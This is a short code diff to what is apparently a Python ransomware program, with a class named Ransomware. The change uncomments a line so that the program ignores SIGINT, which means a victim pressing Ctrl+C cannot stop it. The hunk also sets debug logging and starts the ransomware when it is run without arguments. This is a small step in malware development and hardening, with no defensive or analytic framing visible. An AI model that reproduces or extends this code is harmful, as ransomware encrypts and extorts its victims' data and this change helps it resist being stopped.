@@ -182,7 +182,7 @@ class Ransomware:
 
 
 if __name__ == "__main__":
-    # signal.signal(signal.SIGINT, signal.SIG_IGN)
+    signal.signal(signal.SIGINT, signal.SIG_IGN)
     logging.basicConfig(level=logging.DEBUG)
     if len(sys.argv) < 2:
         ransomware = Ransomware()
